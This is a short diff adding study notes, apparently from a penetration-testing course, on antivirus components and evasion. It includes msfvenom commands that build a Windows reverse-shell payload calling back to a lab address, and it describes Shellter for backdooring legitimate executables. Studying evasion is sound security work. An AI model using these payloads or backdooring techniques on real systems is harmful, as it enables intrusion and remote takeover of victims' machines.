@@ -1,0 +1,10 @@
+---Antivirus Software Key Components and Operations---
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
+
+---Bypassing Antivirus Detections---
+Our chosen payload is missing from our script but can be generated using msfvenom. We are going to keep the payload identical to the one used in previous tests for consistency.
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
+
++++Automating the Process
+Shellter is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software. It uses several novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload.
+
